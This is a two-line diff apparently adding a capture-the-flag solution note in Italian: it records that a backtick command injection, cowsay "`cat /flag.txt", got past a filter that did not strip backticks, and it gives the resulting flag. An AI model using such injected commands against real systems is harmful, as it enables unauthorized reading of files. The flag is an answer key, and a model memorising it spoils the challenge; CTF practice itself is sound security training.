@@ -1,0 +1,2 @@
+dovevo scrivere cowsay "`cat /flag.txt", il backtick non veniva levato dall funzione di sicurezza 
+flag{1t's_4_l0ng_fl4g_but_s0me0n3_h4d_t0_re4d_1t!}
